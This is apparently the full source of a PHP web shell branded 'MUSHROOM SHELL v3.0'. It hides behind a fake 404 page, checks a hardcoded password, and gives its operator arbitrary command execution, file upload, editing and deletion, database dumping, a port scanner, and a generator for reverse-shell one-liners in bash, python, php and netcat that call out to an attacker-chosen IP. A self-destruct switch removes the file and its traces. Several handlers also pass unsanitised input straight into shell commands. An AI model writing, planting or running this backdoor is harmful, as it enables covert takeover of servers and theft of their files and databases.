<?php
define('PASSWORD','mushr00wpwn');
define('HASH',md5(PASSWORD));
define('MAX_LOGIN_ATTEMPTS',5);
define('LOCKOUT_TIME',900);
define('SECRET_KEY','mushroom_special_2026');
$ALLOWED_USER_AGENTS=['Mozilla/5.0','Chrome','Firefox','Safari','Edge'];
define('HIDDEN_MODE',true);
define('HIDDEN_PARAM','mushroom');
session_start();
if(HIDDEN_MODE&&!isset($_REQUEST[HIDDEN_PARAM])){header('HTTP/1.0 404 Not Found');echo'<h1>404 Not Found</h1>';exit;}
$ua=$_SERVER['HTTP_USER_AGENT']??'';$allowed=false;foreach($ALLOWED_USER_AGENTS as $p){if(stripos($ua,$p)!==false){$allowed=true;break;}}
if(!$allowed){header('HTTP/1.0 403 Forbidden');exit;}
function get_client_ip(){$ip=$_SERVER['REMOTE_ADDR']??'0.0.0.0';$h=['HTTP_X_FORWARDED_FOR','HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP'];foreach($h as $k){if(!empty($_SERVER[$k])){$ips=explode(',',$_SERVER[$k]);$ip=trim($ips[0]);break;}}return$ip;}
$client_ip=get_client_ip();
$log_file=__DIR__.'/.mushroom_log';if(file_exists($log_file)){@unlink($log_file);}
function write_log($msg){global$log_file;$time=date('Y-m-d H:i:s');file_put_contents($log_file,"[$time] $msg\n",FILE_APPEND);}
$lock_file=__DIR__.'/.mushroom_lock';$attempts_file=__DIR__.'/.mushroom_attempts';
if(file_exists($lock_file)&&(time()-filemtime($lock_file))<LOCKOUT_TIME){$r=LOCKOUT_TIME-(time()-filemtime($lock_file));die("<h2 style='color:#ff0044;text-align:center;margin-top:50px;'>🔒 Too many failed attempts. Try again in ".ceil($r/60)." minutes.</h2>");}
$authenticated=false;
if(isset($_POST['pass'])&&$_POST['pass']===PASSWORD){$_SESSION['auth']=HASH;$authenticated=true;write_log("LOGIN SUCCESS from ".get_client_ip());@unlink($attempts_file);header("Location: ".$_SERVER['PHP_SELF'].'?'.HIDDEN_PARAM.'=1');exit;}
elseif(isset($_POST['pass'])){$attempts=0;if(file_exists($attempts_file)){$attempts=(int)file_get_contents($attempts_file);}$attempts++;file_put_contents($attempts_file,$attempts);write_log("LOGIN FAILED from ".get_client_ip()." (attempt $attempts)");if($attempts>=MAX_LOGIN_ATTEMPTS){file_put_contents($lock_file,time());@unlink($attempts_file);die("<h2 style='color:#ff0044;text-align:center;margin-top:50px;'>🔒 Locked out for 15 minutes.</h2>");}}
if(isset($_SESSION['auth'])&&$_SESSION['auth']===HASH){$authenticated=true;}
if(!$authenticated){$attempts=file_exists($attempts_file)?(int)file_get_contents($attempts_file):0;$remaining=MAX_LOGIN_ATTEMPTS-$attempts;echo'
<!DOCTYPE html>
<html>
<head><title>MUSHROOM SHELL - LOGIN</title>
<style>
body{background:#0a0a0a;color:#00ff00;font-family:"Courier New",monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.container{background:#111;padding:40px;border:2px solid #00ff00;border-radius:15px;box-shadow:0 0 40px rgba(0,255,0,0.15);text-align:center;min-width:320px;}
h2{color:#00ff00;text-shadow:0 0 10px #00ff00;margin-bottom:20px;}
input[type="password"]{background:#0a0a0a;color:#00ff00;border:1px solid #00ff00;padding:12px 20px;width:220px;border-radius:5px;font-family:"Courier New",monospace;outline:none;}
input[type="password"]:focus{border-color:#00ff00;box-shadow:0 0 20px rgba(0,255,0,0.2);}
button{background:#00ff00;color:#0a0a0a;padding:12px 30px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-family:"Courier New",monospace;transition:0.3s;}
button:hover{background:#00cc00;box-shadow:0 0 30px rgba(0,255,0,0.3);}
.attempts{color:#666;font-size:12px;margin-top:15px;}
.footer{color:#444;font-size:11px;margin-top:20px;}
</style>
</head>
<body>
<div class="container">
<h2>MUSHROOM SHELL</h2>
<form method="POST"><input type="password" name="pass" placeholder="Enter password" autofocus><br><br><button type="submit">LOGIN</button></form>
<div class="attempts">'.($remaining>0?"Remaining attempts: $remaining":"Last chance!").'</div>
<div class="footer">Secure Session</div>
</div>
</body>
</html>';exit;}
if(isset($_GET['logout'])){session_destroy();setcookie('auth','',time()-3600,'/');header("Location: ".$_SERVER['PHP_SELF'].'?'.HIDDEN_PARAM.'=1');exit;}
if(isset($_GET['kill'])&&$_GET['kill']==='mushroom_destroy'){@unlink(__FILE__);@unlink($log_file);@unlink($lock_file);@unlink($attempts_file);echo"File destroyed.";exit;}
if(isset($_GET['cmd'])){$cmd=$_GET['cmd'];$output=shell_exec($cmd." 2>&1");echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}
if(isset($_GET['download'])){$file=$_GET['download'];if(file_exists($file)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($file).'"');header('Content-Length: '.filesize($file));readfile($file);exit;}echo"File not found.";exit;}
if(isset($_GET['delete'])){$file=$_GET['delete'];if(file_exists($file)){if(is_dir($file)){rmdir($file);}else{unlink($file);}echo"Deleted: $file";}else{echo"File not found.";}exit;}
if(isset($_GET['rename'])&&isset($_GET['to'])){$old=$_GET['rename'];$new=$_GET['to'];if(file_exists($old)&&rename($old,$new)){echo"Renamed: $old → $new";}else{echo"Rename failed.";}exit;}
if(isset($_GET['mkdir'])){$dir=$_GET['mkdir'];if(!file_exists($dir)&&mkdir($dir,0755,true)){echo"Directory created: $dir";}else{echo"Failed to create directory.";}exit;}
if(isset($_GET['create'])){$file=$_GET['create'];if(!file_exists($file)&&touch($file)){echo"File created: $file";}else{echo"Failed to create file.";}exit;}
if(isset($_POST['edit_save'])){$file=$_POST['edit_file'];$content=$_POST['edit_content'];if(file_put_contents($file,$content)){echo"Saved: $file";}else{echo"Save failed.";}exit;}
if(isset($_GET['search'])){$keyword=$_GET['search'];$output=shell_exec("find . -type f -exec grep -l '$keyword' {} \; 2>/dev/null | head -50");echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}
if(isset($_GET['zip'])){$target=$_GET['zip'];$zipfile=$target.'.zip';shell_exec("zip -r $zipfile $target 2>&1");echo"Zipped: $target → $zipfile";exit;}
if(isset($_GET['unzip'])){$file=$_GET['unzip'];shell_exec("unzip -o $file -d . 2>&1");echo"Unzipped: $file";exit;}
if(isset($_GET['chmod'])&&isset($_GET['perm'])){$file=$_GET['chmod'];$perm=$_GET['perm'];if(chmod($file,octdec($perm))){echo"Permission changed: $file → $perm";}else{echo"Chmod failed.";}exit;}
if(isset($_FILES['file'])){$target=basename($_FILES['file']['name']);if(move_uploaded_file($_FILES['file']['tmp_name'],$target)){echo"<h3 style='color:#00ff00;'>Uploaded: <a href='$target' style='color:#00ff00;'>$target</a></h3>";}else{echo"<h3 style='color:#ff0044;'>Upload failed!</h3>";}exit;}
if(isset($_GET['sysinfo'])){$type=$_GET['sysinfo'];$output='';switch($type){case'profile':$output="PHP: ".phpversion()."\nOS: ".php_uname()."\nServer: ".($_SERVER['SERVER_SOFTWARE']??'Unknown')."\nModules: ".implode(', ',get_loaded_extensions());break;case'disk':$output=shell_exec("df -h 2>&1");break;case'cpu':$output=shell_exec("top -bn1 | head -25 2>&1");break;case'ram':$output=shell_exec("free -m 2>&1");break;case'process':$output=shell_exec("ps aux 2>&1 | head -50");break;case'network':$output=shell_exec("netstat -tulpn 2>&1 | head -30");break;case'services':$svcs=['mysql','nginx','apache2','ssh','php-fpm'];foreach($svcs as $s){$st=shell_exec("systemctl is-active $s 2>&1");$output.="$s: ".trim($st)."\n";}break;case'logs':$output=shell_exec("tail -50 /var/log/syslog 2>&1");if(empty(trim($output))){$output=shell_exec("tail -50 /var/log/messages 2>&1");}break;default:$output="Unknown sysinfo type.";}echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}
if(isset($_GET['db'])&&isset($_GET['action'])){$action=$_GET['action'];$output='';if($action==='connect'&&isset($_POST['db_host'])&&isset($_POST['db_user'])){$host=$_POST['db_host'];$user=$_POST['db_user'];$pass=$_POST['db_pass']??'';$name=$_POST['db_name']??'';try{$db=new mysqli($host,$user,$pass,$name);if($db->connect_error){$output="Connection failed: ".$db->connect_error;}else{$output="Connected to $host\nServer: ".$db->server_info."\nDatabase: $name";$_SESSION['db']=serialize(['host'=>$host,'user'=>$user,'pass'=>$pass,'name'=>$name]);}}catch(Exception$e){$output="Error: ".$e->getMessage();}echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}if($action==='tables'&&isset($_SESSION['db'])){$dbinfo=unserialize($_SESSION['db']);$db=new mysqli($dbinfo['host'],$dbinfo['user'],$dbinfo['pass'],$dbinfo['name']);$result=$db->query("SHOW TABLES");$output="Tables in ".$dbinfo['name'].":\n";while($row=$result->fetch_array()){$output.="  - ".$row[0]."\n";}echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}if($action==='query'&&isset($_POST['sql_query'])){$sql=$_POST['sql_query'];$dbinfo=unserialize($_SESSION['db']);$db=new mysqli($dbinfo['host'],$dbinfo['user'],$dbinfo['pass'],$dbinfo['name']);$result=$db->query($sql);if($result===true){$output="Query executed successfully.";}elseif($result){$output="Results:\n";while($row=$result->fetch_assoc()){$output.=json_encode($row)."\n";}}else{$output="Error: ".$db->error;}echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}if($action==='export'&&isset($_SESSION['db'])){$dbinfo=unserialize($_SESSION['db']);$db=new mysqli($dbinfo['host'],$dbinfo['user'],$dbinfo['pass'],$dbinfo['name']);$tables=$db->query("SHOW TABLES");$sql="-- Database Export\n";while($row=$tables->fetch_array()){$table=$row[0];$sql.="DROP TABLE IF EXISTS `$table`;\n";$create=$db->query("SHOW CREATE TABLE `$table`")->fetch_assoc();$sql.=$create['Create Table'].";\n";}header('Content-Type: application/sql');header('Content-Disposition: attachment; filename="export_'.date('Ymd_His').'.sql"');echo$sql;exit;}}
if(isset($_GET['portscan'])&&isset($_GET['host'])){$host=$_GET['host'];$ports=isset($_GET['ports'])?explode(',',$_GET['ports']):[22,80,443,3306,5432,6379,8080,8443];$output="Scanning $host...\n";foreach($ports as $port){$conn=@fsockopen($host,$port,$errno,$errstr,2);$output.=$conn?"Port $port open\n":"Port $port closed\n";if($conn)fclose($conn);}echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}
if(isset($_GET['reverseshell'])&&isset($_GET['ip'])&&isset($_GET['port'])){$ip=$_GET['ip'];$port=$_GET['port'];$output="Reverse shell commands:\n\n";$output.="Bash: bash -i >& /dev/tcp/$ip/$port 0>&1\n";$output.="Python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n";$output.="PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n";$output.="Netcat: nc -e /bin/sh $ip $port\n";echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars($output)."</pre>";exit;}
?>
<!DOCTYPE html>
<html>
<head>
<title>MUSHROOM SHELL</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{background:#0a0a0a;color:#00ff00;font-family:"Courier New",monospace;margin:0;padding:0;display:flex;min-height:100vh;}
.sidebar{width:200px;background:#0d0d0d;border-right:2px solid #00ff00;padding:20px 0;min-height:100vh;flex-shrink:0;overflow-y:auto;}
.sidebar .logo{text-align:center;padding:0 15px 20px 15px;border-bottom:1px solid #222;margin-bottom:15px;}
.sidebar .logo h2{color:#00ff00;text-shadow:0 0 15px #00ff00;font-size:18px;}
.sidebar .menu-item{display:block;padding:12px 22px;color:#00ff00;text-decoration:none;border-left:3px solid transparent;transition:0.2s;font-size:16px;cursor:pointer;font-weight:bold;}
.sidebar .menu-item:hover,.sidebar .menu-item.active{background:#1a1a1a;border-left-color:#00ff00;}
.sidebar .menu-item.logout{border-left-color:#ff0044;color:#ff0044;margin-top:20px;border-top:1px solid #222;padding-top:15px;font-size:16px;}
.sidebar .menu-item.logout:hover{background:#1a0000;}
.main{flex:1;padding:20px;max-width:calc(100% - 200px);overflow-x:auto;}
.container{max-width:1100px;margin:0 auto;background:#111;border:2px solid #00ff00;border-radius:15px;padding:25px;box-shadow:0 0 50px rgba(0,255,0,0.05);}
h2{color:#00ff00;text-shadow:0 0 15px #00ff00;margin-top:0;border-bottom:1px solid #00ff00;padding-bottom:10px;font-size:20px;}
h3{color:#00ff00;border-bottom:1px solid #333;padding-bottom:8px;margin-top:18px;font-size:16px;}
.info{background:#0a0a0a;padding:12px 18px;border-radius:5px;border:1px solid #222;margin-bottom:20px;font-size:14px;}
.info span{color:#00ff00;}
input[type="text"],input[type="password"],input[type="number"],select,textarea{background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:10px 15px;border-radius:5px;width:100%;font-family:"Courier New",monospace;font-size:14px;}
input:focus,select:focus,textarea:focus{border-color:#00ff00;outline:none;box-shadow:0 0 15px rgba(0,255,0,0.05);}
button{background:#00ff00;color:#0a0a0a;padding:10px 25px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-family:"Courier New",monospace;transition:0.3s;font-size:14px;}
button:hover{background:#00cc00;box-shadow:0 0 30px rgba(0,255,0,0.2);}
.btn-danger{background:#ff0044;color:#fff;}
.btn-danger:hover{background:#cc0033;}
.btn-small{padding:5px 12px;font-size:12px;}
.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:8px;}
.row input,.row select{flex:1;min-width:150px;}
.row button{flex-shrink:0;}
.output{background:#0a0a0a;padding:15px;border:1px solid #333;border-radius:5px;margin-top:10px;white-space:pre-wrap;min-height:60px;overflow-x:auto;font-size:13px;line-height:1.5;}
.file-list{max-height:350px;overflow-y:auto;}
.file-list pre{margin:0;}
hr{border:none;border-top:1px solid #333;margin:18px 0;}
.footer{color:#555;font-size:12px;text-align:center;margin-top:18px;display:flex;justify-content:center;gap:20px;flex-wrap:wrap;}
.footer a{color:#ff0044;text-decoration:none;}
.footer a:hover{text-decoration:underline;}
.status{display:inline-block;padding:2px 12px;border-radius:3px;font-size:12px;background:#00ff00;color:#0a0a0a;}
a{color:#00ff00;text-decoration:none;}
a:hover{text-decoration:underline;}
.hidden-section{display:none;}
.section-active{display:block;}
#toast{position:fixed;top:20px;right:20px;padding:15px 25px;border-radius:8px;color:#0a0a0a;font-weight:bold;z-index:9999;opacity:0;transition:0.5s;pointer-events:none;max-width:400px;}
#toast.success{background:#00ff00;opacity:1;}
#toast.error{background:#ff0044;opacity:1;}
#toast.info{background:#00aaff;opacity:1;}
.spinner{display:none;border:3px solid #333;border-top:3px solid #00ff00;border-radius:50%;width:30px;height:30px;animation:spin 0.7s linear infinite;margin:10px auto;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
@media(max-width:768px){body{flex-direction:column;}.sidebar{width:100%;min-height:auto;border-right:none;border-bottom:2px solid #00ff00;padding:10px 0;display:flex;flex-wrap:wrap;justify-content:center;}.sidebar .logo{display:none;}.sidebar .menu-item{padding:10px 16px;font-size:14px;border-left:none;border-bottom:1px solid #222;}.sidebar .menu-item.logout{border-top:none;margin-top:0;}.main{max-width:100%;padding:10px;}.container{padding:15px;}.row{flex-direction:column;}.row input,.row select{min-width:100%;}#toast{max-width:90%;font-size:13px;padding:12px 18px;}}
@media(max-width:480px){.container{padding:10px;}.info{font-size:12px;padding:8px 12px;}button{padding:8px 15px;font-size:12px;}input,select,textarea{font-size:12px;padding:8px 10px;}h2{font-size:17px;}}
.tab-content{display:none;}
.tab-content.active{display:block;}
.menu-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:6px;margin:10px 0;}
.menu-grid button{width:100%;text-align:center;font-size:12px;padding:8px 5px;}
</style>
</head>
<body>
<div class="sidebar">
<div class="logo"><h2>MUSHROOM</h2></div>
<a class="menu-item active" data-section="dashboard" onclick="showSection('dashboard')">📟 Dashboard</a>
<a class="menu-item" data-section="files" onclick="showSection('files')">📂 Files</a>
<a class="menu-item" data-section="cmd" onclick="showSection('cmd')">💻 Command</a>
<a class="menu-item" data-section="system" onclick="showSection('system')">🖥️ System</a>
<a class="menu-item" data-section="database" onclick="showSection('database')">🗄️ Database</a>
<a class="menu-item" data-section="network" onclick="showSection('network')">🌐 Network</a>
<a class="menu-item logout" onclick="logoutOrKill()">🚪 Logout</a>
</div>
<div class="main">
<div class="container" id="main-container">
<div id="toast"></div>
<div id="section-dashboard" class="tab-content active">
<h2>MUSHROOM SHELL v3.0</h2>
<div class="info">
<div><span>User:</span> <?=htmlspecialchars(shell_exec("whoami 2>&1"))?></div>
<div><span>PWD:</span> <?=htmlspecialchars(shell_exec("pwd 2>&1"))?></div>
<div><span>Hostname:</span> <?=htmlspecialchars(shell_exec("hostname 2>&1"))?></div>
<div><span>IP:</span> <?=htmlspecialchars(get_client_ip())?></div>
<div><span>Status:</span> <span class="status">ONLINE</span></div>
</div>
<h3>Quick System Info</h3>
<div class="menu-grid">
<button onclick="fetchSysInfo('profile')">Profile</button>
<button onclick="fetchSysInfo('disk')">Disk</button>
<button onclick="fetchSysInfo('cpu')">CPU</button>
<button onclick="fetchSysInfo('ram')">RAM</button>
<button onclick="fetchSysInfo('process')">Processes</button>
<button onclick="fetchSysInfo('network')">Network</button>
<button onclick="fetchSysInfo('services')">Services</button>
<button onclick="fetchSysInfo('logs')">Logs</button>
</div>
<div id="sysinfo-output" class="output">Click a button to view system info...</div>
</div>
<div id="section-files" class="tab-content">
<h2>File Manager</h2>
<h3>File List</h3>
<div class="output file-list"><pre><?=htmlspecialchars(shell_exec("ls -la --color=never 2>&1"))?></pre></div>
<h3>Upload File</h3>
<div class="row"><input type="file" id="file-input"><button onclick="uploadFile()">UPLOAD</button></div>
<div id="upload-status"></div>
<h3>File Operations</h3>
<div class="row"><input type="text" id="file-path" placeholder="File/dir path" style="flex:2;"><button onclick="fileAction('create')">Create</button><button onclick="fileAction('mkdir')">Mkdir</button><button onclick="fileAction('delete')">Delete</button><button onclick="fileAction('download')">Download</button></div>
<div class="row"><input type="text" id="file-rename-old" placeholder="Old name" style="flex:1;"><input type="text" id="file-rename-new" placeholder="New name" style="flex:1;"><button onclick="fileAction('rename')">Rename</button></div>
<div class="row"><input type="text" id="file-search" placeholder="Search keyword..." style="flex:1;"><button onclick="fileAction('search')">Search</button></div>
<div class="row"><input type="text" id="file-zip" placeholder="File/dir to zip" style="flex:1;"><button onclick="fileAction('zip')">Zip</button><button onclick="fileAction('unzip')">Unzip</button></div>
<div class="row"><input type="text" id="file-chmod" placeholder="File path" style="flex:1;"><input type="text" id="file-perm" placeholder="Permission (e.g. 755)" style="flex:1;"><button onclick="fileAction('chmod')">Chmod</button></div>
<h3>Edit File</h3>
<div class="row"><input type="text" id="edit-file-path" placeholder="File to edit" style="flex:1;"><button onclick="loadEditFile()">Load</button></div>
<textarea id="edit-file-content" rows="12" style="width:100%;background:#0a0a0a;color:#00ff00;border:1px solid #333;border-radius:5px;padding:10px;font-family:'Courier New',monospace;font-size:13px;margin-top:5px;"></textarea>
<button onclick="saveEditFile()" style="margin-top:8px;">Save</button>
<div id="edit-status"></div>
</div>
<div id="section-cmd" class="tab-content">
<h2>Command Center</h2>
<h3>Command</h3>
<div class="row"><input type="text" id="cmd-input" placeholder="Enter command..." onkeydown="if(event.key==='Enter'){runCmd();}"><button onclick="runCmd()">RUN</button><button onclick="clearOutput()" class="btn-small">Clear</button></div>
<div class="spinner" id="cmd-spinner"></div>
<div class="output" id="cmd-output">Ready...</div>
<h3>Command History</h3>
<div class="output" id="history-output" style="max-height:150px;overflow-y:auto;">
<?php $hist=__DIR__.'/.cmd_history';if(file_exists($hist)){$history=array_reverse(array_slice(file($hist),-20));echo htmlspecialchars(implode('',$history));}else{echo"No history yet.";}?>
</div>
<h3>Batch Script</h3>
<div class="row"><textarea id="batch-script" rows="6" style="width:100%;background:#0a0a0a;color:#00ff00;border:1px solid #333;border-radius:5px;padding:10px;font-family:'Courier New',monospace;font-size:13px;" placeholder="Enter commands, one per line..."></textarea></div>
<button onclick="runBatch()">RUN BATCH</button>
<div id="batch-output" class="output" style="margin-top:8px;">Ready...</div>
</div>
<div id="section-system" class="tab-content">
<h2>System Information</h2>
<div class="menu-grid">
<button onclick="fetchSysInfo('profile')">Profile</button>
<button onclick="fetchSysInfo('disk')">Disk</button>
<button onclick="fetchSysInfo('cpu')">CPU</button>
<button onclick="fetchSysInfo('ram')">RAM</button>
<button onclick="fetchSysInfo('process')">Processes</button>
<button onclick="fetchSysInfo('network')">Network</button>
<button onclick="fetchSysInfo('services')">Services</button>
<button onclick="fetchSysInfo('logs')">Logs</button>
</div>
<div id="sysinfo-output-full" class="output">Select a category above...</div>
</div>
<div id="section-database" class="tab-content">
<h2>Database Manager</h2>
<h3>Connect</h3>
<div class="row"><input type="text" id="db-host" placeholder="Host" value="localhost"><input type="text" id="db-user" placeholder="Username"><input type="password" id="db-pass" placeholder="Password"><input type="text" id="db-name" placeholder="Database name"><button onclick="dbConnect()">Connect</button></div>
<div id="db-status" class="output">Not connected.</div>
<h3>Tables</h3>
<button onclick="dbTables()">List Tables</button>
<div id="db-tables" class="output"></div>
<h3>SQL Query</h3>
<div class="row"><textarea id="sql-query" rows="5" style="width:100%;background:#0a0a0a;color:#00ff00;border:1px solid #333;border-radius:5px;padding:10px;font-family:'Courier New',monospace;font-size:13px;" placeholder="SELECT * FROM table"></textarea></div>
<button onclick="dbQuery()">Run Query</button>
<div id="sql-result" class="output"></div>
<h3>Export</h3>
<button onclick="dbExport()">Export .sql</button>
</div>
<div id="section-network" class="tab-content">
<h2>Network Tools</h2>
<h3>Port Scanner</h3>
<div class="row"><input type="text" id="scan-host" placeholder="Target IP/Host" style="flex:1;"><input type="text" id="scan-ports" placeholder="Ports (e.g. 22,80,443)" style="flex:1;"><button onclick="portScan()">Scan</button></div>
<div id="scan-result" class="output">Enter target and ports...</div>
<h3>Reverse Shell Generator</h3>
<div class="row"><input type="text" id="rev-ip" placeholder="Your IP" style="flex:1;"><input type="text" id="rev-port" placeholder="Port" value="4444" style="flex:1;"><button onclick="generateReverse()">Generate</button></div>
<div id="rev-result" class="output">Enter your IP and port...</div>
</div>
<hr>
<div class="footer"><span>MUSHROOM SHELL v3.0</span><a href="#" onclick="if(confirm('Logout?')){window.location.href='?<?=HIDDEN_PARAM?>=1&logout=1';}">🚪 Logout</a></div>
</div>
</div>
<script>
var cmdHistory=[];var historyIndex=-1;
function showSection(id){document.querySelectorAll('.tab-content').forEach(function(el){el.classList.remove('active');});document.getElementById('section-'+id).classList.add('active');document.querySelectorAll('.menu-item').forEach(function(el){el.classList.remove('active');});document.querySelector('[data-section="'+id+'"]').classList.add('active');}
function showToast(msg,type){var t=document.getElementById('toast');t.textContent=msg;t.className=type;t.style.opacity='1';setTimeout(function(){t.style.opacity='0';},3000);}
function logoutOrKill(){if(confirm('Logout?')){window.location.href='?<?=HIDDEN_PARAM?>=1&logout=1';}else{if(confirm('Self-Destruct?')){window.location.href='?<?=HIDDEN_PARAM?>=1&kill=mushroom_destroy';}}}
function runCmd(){var cmd=document.getElementById('cmd-input').value.trim();if(!cmd){document.getElementById('cmd-output').innerHTML='Please enter a command.';return;}if(cmdHistory.length===0||cmdHistory[cmdHistory.length-1]!==cmd){cmdHistory.push(cmd);}historyIndex=cmdHistory.length;var out=document.getElementById('cmd-output');var spinner=document.getElementById('cmd-spinner');spinner.style.display='block';out.innerHTML='Running...';fetch('?<?=HIDDEN_PARAM?>=1&cmd='+encodeURIComponent(cmd)).then(function(r){return r.text();}).then(function(data){out.innerHTML=data;spinner.style.display='none';showToast('Command executed','info');}).catch(function(e){out.innerHTML='Error: '+e;spinner.style.display='none';showToast('Error!','error');});}
document.getElementById('cmd-input').addEventListener('keydown',function(e){if(e.key==='ArrowUp'){e.preventDefault();if(historyIndex>0){historyIndex--;this.value=cmdHistory[historyIndex]||'';}else if(historyIndex===-1&&cmdHistory.length>0){historyIndex=cmdHistory.length-1;this.value=cmdHistory[historyIndex];}}else if(e.key==='ArrowDown'){e.preventDefault();if(historyIndex<cmdHistory.length-1){historyIndex++;this.value=cmdHistory[historyIndex]||'';}else if(historyIndex===cmdHistory.length-1){historyIndex=-1;this.value='';}}});
function clearOutput(){document.getElementById('cmd-output').innerHTML='Ready...';}
function runBatch(){var script=document.getElementById('batch-script').value;if(!script)return;var out=document.getElementById('batch-output');out.innerHTML='Running batch...';var lines=script.split('\n').filter(function(l){return l.trim();});var results='';var i=0;function runNext(){if(i>=lines.length){out.innerHTML=results||'Done.';return;}var cmd=lines[i];fetch('?<?=HIDDEN_PARAM?>=1&cmd='+encodeURIComponent(cmd)).then(function(r){return r.text();}).then(function(data){results+='> '+cmd+'\n'+data+'\n---\n';i++;runNext();});}runNext();}
function uploadFile(){var file=document.getElementById('file-input').files[0];if(!file){alert('Select a file first!');return;}var form=new FormData();form.append('file',file);var status=document.getElementById('upload-status');status.innerHTML='Uploading...';fetch('',{method:'POST',body:form}).then(function(r){return r.text();}).then(function(data){status.innerHTML=data;showToast('File uploaded!','success');}).catch(function(e){status.innerHTML='Error: '+e;});}
function fileAction(action){var path=document.getElementById('file-path').value.trim();var url='';switch(action){case'create':url='?<?=HIDDEN_PARAM?>=1&create='+encodeURIComponent(path);break;case'mkdir':url='?<?=HIDDEN_PARAM?>=1&mkdir='+encodeURIComponent(path);break;case'delete':if(!path||!confirm('Delete: '+path+'?'))return;url='?<?=HIDDEN_PARAM?>=1&delete='+encodeURIComponent(path);break;case'download':if(path)window.location.href='?<?=HIDDEN_PARAM?>=1&download='+encodeURIComponent(path);return;case'rename':var old=document.getElementById('file-rename-old').value.trim();var newname=document.getElementById('file-rename-new').value.trim();if(!old||!newname){alert('Old and new names required!');return;}url='?<?=HIDDEN_PARAM?>=1&rename='+encodeURIComponent(old)+'&to='+encodeURIComponent(newname);break;case'search':var keyword=document.getElementById('file-search').value.trim();if(!keyword){alert('Search keyword required!');return;}url='?<?=HIDDEN_PARAM?>=1&search='+encodeURIComponent(keyword);break;case'zip':var target=document.getElementById('file-zip').value.trim();if(!target){alert('File/dir to zip required!');return;}url='?<?=HIDDEN_PARAM?>=1&zip='+encodeURIComponent(target);break;case'unzip':var target=document.getElementById('file-zip').value.trim();if(!target){alert('Zip file required!');return;}url='?<?=HIDDEN_PARAM?>=1&unzip='+encodeURIComponent(target);break;case'chmod':var file=document.getElementById('file-chmod').value.trim();var perm=document.getElementById('file-perm').value.trim();if(!file||!perm){alert('File and permission required!');return;}url='?<?=HIDDEN_PARAM?>=1&chmod='+encodeURIComponent(file)+'&perm='+encodeURIComponent(perm);break;default:showToast('Unknown action!','error');return;}if(!url)return;fetch(url).then(function(r){return r.text();}).then(function(data){alert(data);showToast('Action completed!','success');}).catch(function(e){alert('Error: '+e);showToast('Error!','error');});}
function loadEditFile(){var file=document.getElementById('edit-file-path').value.trim();if(!file){alert('File path required!');return;}fetch('?<?=HIDDEN_PARAM?>=1&download='+encodeURIComponent(file)).then(function(r){return r.text();}).then(function(data){document.getElementById('edit-file-content').value=data;showToast('File loaded','info');}).catch(function(e){alert('Error loading file: '+e);});}
function saveEditFile(){var file=document.getElementById('edit-file-path').value.trim();var content=document.getElementById('edit-file-content').value;if(!file){alert('File path required!');return;}var form=new FormData();form.append('edit_file',file);form.append('edit_content',content);fetch('',{method:'POST',body:form}).then(function(r){return r.text();}).then(function(data){document.getElementById('edit-status').innerHTML=data;showToast('File saved!','success');}).catch(function(e){alert('Error: '+e);});}
function fetchSysInfo(type){var target=document.getElementById('sysinfo-output');if(document.getElementById('section-system').classList.contains('active')){target=document.getElementById('sysinfo-output-full');}target.innerHTML='Loading...';fetch('?<?=HIDDEN_PARAM?>=1&sysinfo='+type).then(function(r){return r.text();}).then(function(data){target.innerHTML=data;}).catch(function(e){target.innerHTML='Error: '+e;});}
function dbConnect(){var host=document.getElementById('db-host').value;var user=document.getElementById('db-user').value;var pass=document.getElementById('db-pass').value;var name=document.getElementById('db-name').value;if(!host||!user){alert('Host and username required!');return;}var form=new FormData();form.append('db_host',host);form.append('db_user',user);form.append('db_pass',pass);form.append('db_name',name);fetch('?<?=HIDDEN_PARAM?>=1&db=1&action=connect',{method:'POST',body:form}).then(function(r){return r.text();}).then(function(data){document.getElementById('db-status').innerHTML=data;showToast('Database connected!','success');}).catch(function(e){document.getElementById('db-status').innerHTML='Error: '+e;});}
function dbTables(){var out=document.getElementById('db-tables');out.innerHTML='Loading...';fetch('?<?=HIDDEN_PARAM?>=1&db=1&action=tables').then(function(r){return r.text();}).then(function(data){out.innerHTML=data;}).catch(function(e){out.innerHTML='Error: '+e;});}
